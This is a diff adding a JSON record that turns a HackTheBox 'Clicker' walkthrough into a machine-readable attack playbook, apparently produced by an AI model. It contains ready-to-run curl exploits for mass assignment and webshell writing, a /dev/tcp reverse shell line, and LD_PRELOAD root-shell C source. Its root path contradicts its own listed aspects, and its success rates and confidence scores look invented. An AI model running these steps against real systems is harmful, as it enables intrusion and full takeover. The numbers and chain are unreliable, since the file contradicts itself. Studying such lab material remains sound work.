@@ -1,0 +1,1185 @@
+{
+  "writeup_id": "Htb_Clicker",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_mass_assignment_privilege_escalation",
+    "primary_services": [
+      "http",
+      "ssh",
+      "nfs"
+    ],
+    "port_signature": "22+80+111+2049",
+    "service_combination": "ssh+http+nfs",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "mass_assignment_vulnerability",
+    "privilege_path": "web_user_to_admin_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "php_mass_assignment",
+      "role_based_access_control",
+      "file_write_vulnerability",
+      "setuid_binary_abuse"
+    ],
+    "environmental_clues": [
+      "php_web_application",
+      "game_interface",
+      "user_registration_system",
+      "nfs_shares_present"
+    ],
+    "similar_scenarios": [
+      "paper_htb_easy",
+      "bagel_htb_medium"
+    ],
+    "unique_aspects": [
+      "clicker_game_interface",
+      "newline_injection_bypass",
+      "perl_environment_exploitation",
+      "ld_preload_abuse"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Mass Assignment Vulnerability",
+        "success_reason": "Application allowed modification of role parameter during registration/profile update",
+        "prerequisite_indicators": [
+          "php_application_with_forms",
+          "user_registration_available",
+          "parameter_binding_without_whitelist"
+        ],
+        "recognition_patterns": [
+          "POST parameters accepted without validation",
+          "role/privilege fields in forms",
+          "application uses direct object binding"
+        ],
+        "failure_modes": [
+          "parameter_whitelist_implemented",
+          "role_changes_require_separate_authorization",
+          "input_validation_blocks_extra_fields"
+        ],
+        "environmental_factors": [
+          "php_framework_default_behavior",
+          "developer_unfamiliarity_with_mass_assignment",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Filter Bypass via Newline Injection",
+        "success_reason": "Input filters failed to handle newline characters properly",
+        "prerequisite_indicators": [
+          "input_validation_present",
+          "blacklist_based_filtering",
+          "multi_line_input_accepted"
+        ],
+        "recognition_patterns": [
+          "blocked keywords in requests",
+          "filter error messages",
+          "newline characters bypass restrictions"
+        ],
+        "failure_modes": [
+          "whitelist_validation_used",
+          "proper_input_sanitization",
+          "newline_characters_stripped"
+        ],
+        "environmental_factors": [
+          "custom_php_validation_functions",
+          "regex_patterns_without_multiline_flags",
+          "insufficient_character_encoding_handling"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "15-45 minutes"
+      },
+      {
+        "technique": "File Write to Webshell",
+        "success_reason": "Admin functionality allowed file creation in web directory",
+        "prerequisite_indicators": [
+          "admin_panel_access_gained",
+          "file_upload_or_export_functionality",
+          "web_directory_write_permissions"
+        ],
+        "recognition_patterns": [
+          "export/backup functionality available",
+          "file creation endpoints",
+          "insufficient path validation"
+        ],
+        "failure_modes": [
+          "files_written_outside_webroot",
+          "file_extension_restrictions",
+          "content_type_validation"
+        ],
+        "environmental_factors": [
+          "apache_serves_php_files",
+          "web_directory_permissions_misconfigured",
+          "no_file_upload_restrictions"
+        ],
+        "success_probability": 0.8,
+        "typical_timeframe": "5-20 minutes"
+      },
+      {
+        "technique": "SetUID Binary Exploitation",
+        "success_reason": "Custom SetUID binary had exploitable functionality for file access",
+        "prerequisite_indicators": [
+          "custom_setuid_binaries_present",
+          "binary_performs_file_operations",
+          "insufficient_input_validation"
+        ],
+        "recognition_patterns": [
+          "find / -perm -4000 shows custom binaries",
+          "binary accepts user input",
+          "file read/write operations"
+        ],
+        "failure_modes": [
+          "proper_input_validation_implemented",
+          "restricted_file_access_paths",
+          "no_custom_setuid_binaries"
+        ],
+        "environmental_factors": [
+          "custom_application_deployment",
+          "developer_created_privilege_escalation",
+          "insufficient_security_review"
+        ],
+        "success_probability": 0.7,
+        "typical_timeframe": "20-60 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Mass assignment in user registration",
+        "discovery_method": "Parameter manipulation during registration",
+        "why_critical": "Allowed privilege escalation to admin role",
+        "how_to_recognize": [
+          "registration forms with hidden role fields",
+          "POST parameters not validated",
+          "role changes without authorization"
+        ],
+        "follow_up_actions": [
+          "test_role_parameter_injection",
+          "enumerate_admin_functionality",
+          "look_for_file_operations"
+        ]
+      },
+      {
+        "discovery": "Admin export functionality",
+        "discovery_method": "Accessing admin panel after privilege escalation",
+        "why_critical": "Provided file write capability for webshell deployment",
+        "how_to_recognize": [
+          "export/backup features in admin panels",
+          "file creation functionality",
+          "insufficient path validation"
+        ],
+        "follow_up_actions": [
+          "test_file_write_locations",
+          "attempt_webshell_upload",
+          "verify_code_execution"
+        ]
+      },
+      {
+        "discovery": "Custom SetUID binary",
+        "discovery_method": "Standard privilege escalation enumeration",
+        "why_critical": "Provided path to read SSH keys of other users",
+        "how_to_recognize": [
+          "unusual binaries in setuid search",
+          "custom application binaries",
+          "file operation capabilities"
+        ],
+        "follow_up_actions": [
+          "analyze_binary_functionality",
+          "test_input_validation",
+          "target_sensitive_files"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "user_to_admin",
+        "escalation_method": "mass_assignment_role_change",
+        "why_possible": "Application accepted role parameter without validation",
+        "recognition_signs": [
+          "role_parameter_in_forms",
+          "no_authorization_checks",
+          "direct_parameter_binding"
+        ],
+        "exploitation_path": "Register → Modify role parameter → Admin access"
+      },
+      {
+        "privilege_level": "www-data_to_user",
+        "escalation_method": "setuid_binary_file_read",
+        "why_possible": "Custom SetUID binary allowed arbitrary file access",
+        "recognition_signs": [
+          "custom_setuid_binaries",
+          "file_operation_functionality",
+          "insufficient_path_restrictions"
+        ],
+        "exploitation_path": "Webshell → Find SetUID binary → Read SSH keys"
+      },
+      {
+        "privilege_level": "user_to_root",
+        "escalation_method": "sudo_script_exploitation",
+        "why_possible": "User could run script with sudo that had exploitable features",
+        "recognition_signs": [
+          "sudo_permissions_for_scripts",
+          "environment_variable_control",
+          "ld_preload_opportunities"
+        ],
+        "exploitation_path": "SSH access → sudo -l → Exploit script with LD_PRELOAD"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,111,2049 and multiple NFS-related ports on Linux host",
+        "decision": "Enumerate NFS shares first before web application testing",
+        "reasoning": "NFS often contains backup files or source code that reveals vulnerabilities",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "web_enumeration",
+            "when": "if NFS shares are empty or inaccessible"
+          },
+          {
+            "option": "subdomain_fuzzing",
+            "when": "if domain name is used"
+          }
+        ],
+        "success_indicators": [
+          "nfs_shares_found",
+          "backup_files_discovered",
+          "source_code_obtained"
+        ],
+        "next_decision": "analyze_source_code_for_vulnerabilities"
+      },
+      {
+        "step": 2,
+        "situation": "Obtained website source code from NFS backup",
+        "decision": "Analyze authentication and role management code for privilege escalation",
+        "reasoning": "Source code reveals exact vulnerability patterns and bypass methods",
+        "confidence": 0.95,
+        "prerequisites": [
+          "source_code_available"
+        ],
+        "success_indicators": [
+          "mass_assignment_vulnerability_found",
+          "admin_functionality_discovered"
+        ],
+        "failure_fallbacks": [
+          "web_directory_bruteforce",
+          "parameter_fuzzing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found mass assignment vulnerability in role parameter",
+        "decision": "Test role parameter manipulation with filter bypass techniques",
+        "reasoning": "Mass assignment often allows privilege escalation if input validation is weak",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "newline_injection",
+            "when": "if string filtering is present"
+          },
+          {
+            "option": "sql_injection",
+            "when": "if database queries are involved"
+          },
+          {
+            "option": "direct_parameter_injection",
+            "when": "if no filtering exists"
+          }
+        ],
+        "success_indicators": [
+          "admin_role_assigned",
+          "admin_panel_accessible"
+        ],
+        "next_decision": "exploit_admin_functionality"
+      },
+      {
+        "step": 4,
+        "situation": "Gained admin access to web application",
+        "decision": "Look for file upload or file write functionality in admin panel",
+        "reasoning": "Admin panels typically have file management features exploitable for webshells",
+        "confidence": 0.8,
+        "prerequisites": [
+          "admin_access_confirmed"
+        ],
+        "success_indicators": [
+          "file_write_capability_found",
+          "webshell_upload_successful"
+        ],
+        "failure_fallbacks": [
+          "command_injection_in_admin_features",
+          "path_traversal_attacks"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_nfs_backup_found": {
+        "action": "download_and_analyze_source_code",
+        "tools": [
+          "showmount",
+          "mount",
+          "unzip"
+        ],
+        "next_phase": "static_code_analysis"
+      },
+      "if_mass_assignment_found": {
+        "action": "test_role_parameter_manipulation",
+        "techniques": [
+          "newline_injection",
+          "sql_injection",
+          "direct_assignment"
+        ],
+        "decision_criteria": "based_on_input_validation_present"
+      },
+      "if_admin_access_gained": {
+        "action": "enumerate_admin_functionality",
+        "focus": [
+          "file_operations",
+          "export_features",
+          "system_commands"
+        ],
+        "tools": [
+          "burp_suite",
+          "manual_testing"
+        ]
+      },
+      "if_webshell_uploaded": {
+        "action": "establish_reverse_shell",
+        "next_phase": "privilege_escalation_enumeration",
+        "tools": [
+          "nc",
+          "python_reverse_shell"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_nfs_shares_first_when_available",
+        "reasoning": "nfs_often_contains_source_code_or_sensitive_backups",
+        "applicability": "nfs_ports_detected"
+      },
+      {
+        "rule": "analyze_source_code_for_mass_assignment_vulnerabilities",
+        "reasoning": "common_in_php_applications_with_role_based_access",
+        "applicability": "source_code_available"
+      },
+      {
+        "rule": "test_multiple_filter_bypass_techniques_simultaneously",
+        "reasoning": "different_bypass_methods_work_against_different_validation_approaches",
+        "applicability": "input_validation_detected"
+      },
+      {
+        "rule": "prioritize_admin_file_operations_for_webshell_upload",
+        "reasoning": "admin_panels_commonly_have_export_or_backup_features_with_file_write",
+        "applicability": "admin_access_obtained"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Mass Assignment",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "parameter_binding_enabled",
+          "insufficient_input_validation"
+        ],
+        "success_indicators": [
+          "role_parameter_accepted",
+          "privilege_escalation_achieved",
+          "admin_access_granted"
+        ],
+        "incompatible_with": [
+          "strict_parameter_filtering",
+          "whitelist_validation",
+          "framework_protection_enabled"
+        ],
+        "confidence_boosters": [
+          "php_application",
+          "laravel_framework",
+          "registration_forms_present"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "SQL Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "database_backend_present",
+          "dynamic_sql_queries",
+          "insufficient_input_sanitization"
+        ],
+        "success_indicators": [
+          "sql_error_messages",
+          "authentication_bypass",
+          "data_extraction_successful"
+        ],
+        "incompatible_with": [
+          "prepared_statements_only",
+          "strict_waf_protection",
+          "nosql_database_only"
+        ],
+        "confidence_boosters": [
+          "mysql_backend",
+          "php_application",
+          "login_forms_present"
+        ],
+        "typical_success_rate": 0.72,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "File Write Vulnerability",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "insufficient_file_validation",
+          "writable_web_directory"
+        ],
+        "success_indicators": [
+          "webshell_upload_successful",
+          "code_execution_achieved",
+          "file_system_access_gained"
+        ],
+        "incompatible_with": [
+          "strict_file_type_validation",
+          "read_only_filesystem",
+          "sandboxed_execution"
+        ],
+        "confidence_boosters": [
+          "php_application",
+          "admin_panel_present",
+          "file_management_features"
+        ],
+        "typical_success_rate": 0.58,
+        "estimated_time": "20-60 minutes"
+      },
+      {
+        "technique": "SetUID Binary Exploitation",
+        "mitre_id": "T1548.001",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "setuid_binaries_present",
+          "custom_binaries_installed",
+          "file_system_access"
+        ],
+        "success_indicators": [
+          "privilege_escalation_achieved",
+          "sensitive_file_access",
+          "user_credentials_obtained"
+        ],
+        "incompatible_with": [
+          "no_setuid_binaries",
+          "restricted_shell",
+          "mandatory_access_controls"
+        ],
+        "confidence_boosters": [
+          "custom_applications",
+          "development_environment",
+          "legacy_system"
+        ],
+        "typical_success_rate": 0.45,
+        "estimated_time": "30-90 minutes"
+      },
+      {
+        "technique": "Sudo Privilege Escalation",
+        "mitre_id": "T1548.003",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "sudo_access_granted",
+          "misconfigured_sudo_rules",
+          "exploitable_binaries_allowed"
+        ],
+        "success_indicators": [
+          "root_access_achieved",
+          "sudo_rules_enumerated",
+          "environment_variables_exploitable"
+        ],
+        "incompatible_with": [
+          "no_sudo_access",
+          "restricted_sudo_rules",
+          "secure_sudo_configuration"
+        ],
+        "confidence_boosters": [
+          "ld_preload_allowed",
+          "perl_environment_variables",
+          "proxy_configuration_writable"
+        ],
+        "typical_success_rate": 0.68,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "NFS Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "nfs",
+          "rpcbind"
+        ],
+        "required_ports": [
+          111,
+          2049
+        ],
+        "os_requirements": [
+          "linux",
+          "unix"
+        ],
+        "environmental_prerequisites": [
+          "nfs_service_running",
+          "exported_shares_present",
+          "network_access_allowed"
+        ],
+        "success_indicators": [
+          "shares_enumerated",
+          "sensitive_files_accessible",
+          "configuration_files_found"
+        ],
+        "incompatible_with": [
+          "nfs_disabled",
+          "strict_export_controls",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "multiple_nfs_ports",
+          "development_environment",
+          "backup_shares_present"
+        ],
+        "typical_success_rate": 0.52,
+        "estimated_time": "10-25 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "php_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "php",
+          "apache"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "nfs_service": {
+        "port_indicators": [
+          111,
+          2049,
+          36257,
+          39989,
+          42059
+        ],
+        "service_indicators": [
+          "nfs",
+          "rpcbind",
+          "mountd"
+        ],
+        "banner_indicators": [
+          "nfs_acl",
+          "mountd",
+          "rpcbind"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "Ubuntu"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "mass_assignment",
+          "when": "php_web_application_detected",
+          "reason": "common_vulnerability_in_php_apps"
+        },
+        {
+          "attack": "nfs_enumeration",
+          "when": "nfs_service_detected",
+          "reason": "often_misconfigured_with_sensitive_data"
+        },
+        {
+          "attack": "sql_injection",
+          "when": "login_forms_present",
+          "reason": "high_success_rate_for_authentication_bypass"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "file_write_vulnerability",
+          "when": "admin_access_achieved",
+          "reason": "requires_elevated_privileges_first"
+        },
+        {
+          "attack": "setuid_exploitation",
+          "when": "shell_access_obtained",
+          "reason": "requires_initial_foothold"
+        },
+        {
+          "attack": "sudo_privilege_escalation",
+          "when": "user_access_obtained",
+          "reason": "final_escalation_technique"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Mass Assignment Vulnerability",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST {url} -d '{parameters}' -H 'Content-Type: application/x-www-form-urlencoded'",
+            "actual_command": "curl -X POST http://clicker.htb/save_game.php -d 'clicks=1000&level=1&role=Admin' -H 'Cookie: PHPSESSID=abc123'",
+            "output_pattern": "role parameter accepted in POST data",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "burp_suite",
+            "command_template": "Intercept POST request and add role parameter",
+            "actual_command": "Add &role=Admin to POST body in save_game.php request",
+            "success_factors": [
+              "no_input_validation",
+              "mass_assignment_enabled"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "valid_user_account",
+          "access_to_save_game_endpoint",
+          "no_parameter_filtering"
+        ],
+        "success_indicators": [
+          "role_changed_to_admin",
+          "access_to_admin_panel",
+          "elevated_privileges_confirmed"
+        ],
+        "common_failures": [
+          "parameter_filtering_active",
+          "input_validation_present",
+          "session_not_maintained"
+        ],
+        "follow_up_techniques": [
+          "admin_panel_access",
+          "file_write_exploitation",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Filter Bypass - Newline Injection",
+        "mitre_id": "T1190",
+        "category": "defense_evasion",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST {url} -d 'parameter=%0arole=Admin'",
+            "actual_command": "curl -X POST http://clicker.htb/save_game.php -d 'clicks=1000%0arole=Admin'",
+            "output_pattern": "filter bypassed with newline character",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "parameter_filtering_present",
+          "newline_characters_not_filtered",
+          "mass_assignment_vulnerability"
+        ],
+        "success_indicators": [
+          "filter_bypassed_successfully",
+          "malicious_parameter_accepted",
+          "privilege_escalation_achieved"
+        ],
+        "common_failures": [
+          "newline_characters_filtered",
+          "strict_input_validation",
+          "parameter_whitelist_active"
+        ],
+        "follow_up_techniques": [
+          "admin_functionality_abuse",
+          "file_upload_exploitation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "File Write Vulnerability",
+        "mitre_id": "T1105",
+        "category": "command_and_control",
+        "phase": "persistence",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST {url} -d 'threshold=1&extension=php&filename=shell'",
+            "actual_command": "curl -X POST http://clicker.htb/export.php -d 'threshold=1&extension=php&filename=../shell'",
+            "output_pattern": "file written to web directory",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "admin_access_obtained",
+          "file_export_functionality",
+          "path_traversal_possible"
+        ],
+        "success_indicators": [
+          "php_file_written_successfully",
+          "webshell_accessible_via_http",
+          "code_execution_confirmed"
+        ],
+        "common_failures": [
+          "path_traversal_blocked",
+          "file_extension_filtering",
+          "insufficient_write_permissions"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "system_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "SetUID Binary Exploitation",
+        "mitre_id": "T1548.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "find",
+            "command_template": "find / -perm -4000 -type f 2>/dev/null",
+            "actual_command": "find / -perm -4000 -type f 2>/dev/null | grep -v '/usr/bin'",
+            "output_pattern": "custom setuid binaries found",
+            "effectiveness_rating": 4,
+            "reliability": 0.8
+          },
+          {
+            "name": "custom_binary",
+            "command_template": "./{binary_name} {exploit_parameters}",
+            "actual_command": "./execute_query 'SELECT ssh_key FROM users WHERE username=\"jack\"'",
+            "success_factors": [
+              "sql_injection_possible",
+              "file_read_capability"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "setuid_binary_present",
+          "binary_has_exploitable_functionality",
+          "user_can_execute_binary"
+        ],
+        "success_indicators": [
+          "sensitive_data_extracted",
+          "ssh_key_obtained",
+          "user_escalation_achieved"
+        ],
+        "common_failures": [
+          "binary_properly_secured",
+          "input_validation_present",
+          "no_useful_functionality"
+        ],
+        "follow_up_techniques": [
+          "ssh_key_authentication",
+          "further_privilege_escalation",
+          "persistence_establishment"
+        ],
+        "time_investment": "20-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "LD_PRELOAD Privilege Escalation",
+        "mitre_id": "T1574.006",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "gcc",
+            "command_template": "gcc -shared -fPIC -o {lib_name}.so {source_file}.c",
+            "actual_command": "gcc -shared -fPIC -o exploit.so exploit.c",
+            "output_pattern": "shared library compiled successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "sudo",
+            "command_template": "sudo LD_PRELOAD=./{lib_name}.so {command}",
+            "actual_command": "sudo LD_PRELOAD=./exploit.so /opt/manage/execute_query",
+            "success_factors": [
+              "ld_preload_allowed",
+              "sudo_permissions"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "sudo_access_to_binary",
+          "ld_preload_not_restricted",
+          "gcc_compiler_available"
+        ],
+        "success_indicators": [
+          "shared_library_loaded",
+          "root_shell_obtained",
+          "privilege_escalation_complete"
+        ],
+        "common_failures": [
+          "ld_preload_restricted",
+          "secure_path_set",
+          "compiler_not_available"
+        ],
+        "follow_up_techniques": [
+          "persistence_establishment",
+          "system_compromise",
+          "data_exfiltration"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "curl",
+        "use_case": "web_exploitation_parameter_manipulation",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "burp_suite",
+          "postman"
+        ],
+        "best_practices": [
+          "always_include_proper_headers",
+          "maintain_session_cookies",
+          "url_encode_special_characters"
+        ]
+      },
+      {
+        "tool": "feroxbuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_reconnaissance"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster"
+        ],
+        "best_practices": [
+          "include_relevant_file_extensions",
+          "use_appropriate_wordlists",
+          "filter_false_positives"
+        ]
+      },
+      {
+        "tool": "gcc",
+        "use_case": "privilege_escalation_library_compilation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "ld_preload_exploitation"
+        ],
+        "alternatives": [
+          "clang",
+          "cross_compilation"
+        ],
+        "best_practices": [
+          "compile_with_shared_pic_flags",
+          "test_library_before_exploitation",
+          "clean_up_artifacts_after_use"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "mass_assignment_to_admin",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST http://clicker.htb/register.php -d 'username=test&password=test123'",
+            "purpose": "Create user account",
+            "expected_output": "Account created successfully"
+          },
+          {
+            "step": 2,
+            "command": "curl -X POST http://clicker.htb/authenticate.php -d 'username=test&password=test123' -c cookies.txt",
+            "purpose": "Authenticate and save session",
+            "expected_output": "Login successful with session cookie"
+          },
+          {
+            "step": 3,
+            "command": "curl -X POST http://clicker.htb/save_game.php -d 'clicks=1000&level=1&role=Admin' -b cookies.txt",
+            "purpose": "Exploit mass assignment to become admin",
+            "expected_output": "Game saved with admin role"
+          },
+          {
+            "step": 4,
+            "command": "curl http://clicker.htb/admin.php -b cookies.txt",
+            "purpose": "Verify admin access",
+            "expected_output": "Admin panel accessible"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "webshell_via_file_write",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST http://clicker.htb/export.php -d 'threshold=1&extension=php&filename=../shell' -b cookies.txt",
+            "purpose": "Write PHP webshell via export function",
+            "expected_output": "File written successfully"
+          },
+          {
+            "step": 2,
+            "command": "curl 'http://clicker.htb/shell.php?cmd=id'",
+            "purpose": "Test webshell execution",
+            "expected_output": "Command output showing www-data user"
+          },
+          {
+            "step": 3,
+            "command": "curl 'http://clicker.htb/shell.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/10.10.14.1/4444+0>%261\"'",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "15-25 minutes"
+      },
+      {
+        "sequence_name": "ld_preload_root_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "echo '#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}' > exploit.c",
+            "purpose": "Create malicious shared library source",
+            "expected_output": "Source file created"
+          },
+          {
+            "step": 2,
+            "command": "gcc -shared -fPIC -o exploit.so exploit.c",
+            "purpose": "Compile shared library",
+            "expected_output": "Shared library compiled successfully"
+          },
+          {
+            "step": 3,
+            "command": "sudo LD_PRELOAD=./exploit.so /opt/manage/execute_query",
+            "purpose": "Execute with LD_PRELOAD to get root",
+            "expected_output": "Root shell obtained"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "10-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Clicker",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2023-09-23",
+      "author": "Nooneye",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_application",
+        "mass_assignment",
+        "file_write",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "mass_assignment",
+        "filter_bypass",
+        "file_write",
+        "setuid_binary",
+        "sudo_misconfiguration"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "mass_assignment_attacks",
+        "filter_bypass_techniques",
+        "privilege_escalation_methods",
+        "perl_exploitation"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "sql_injection",
+        "linux_privilege_escalation",
+        "file_system_permissions"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "mass_assignment",
+        "privilege_escalation",
+        "file_write"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "persistence"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "parameter_filtering",
+        "file_upload_restrictions",
+        "sudo_configuration",
+        "setuid_binary_auditing"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bagel",
+        "Shoppy",
+        "Paper"
+      ],
+      "similarity_reasons": [
+        "web_application_focus",
+        "mass_assignment_vulnerability",
+        "multi_stage_privilege_escalation"
+      ],
+      "unique_aspects": [
+        "clicker_game_theme",
+        "perl_environment_exploitation",
+        "ld_preload_abuse",
+        "xxe_proxy_attack"
+      ],
+      "difficulty_factors": [
+        "multiple_filter_bypass_methods",
+        "complex_privilege_escalation_chain",
+        "multiple_root_paths"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T02:18:18.380245",
+    "original_file": "0xdf_writeups/Htb Clicker.md",
+    "content_length": 48524,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
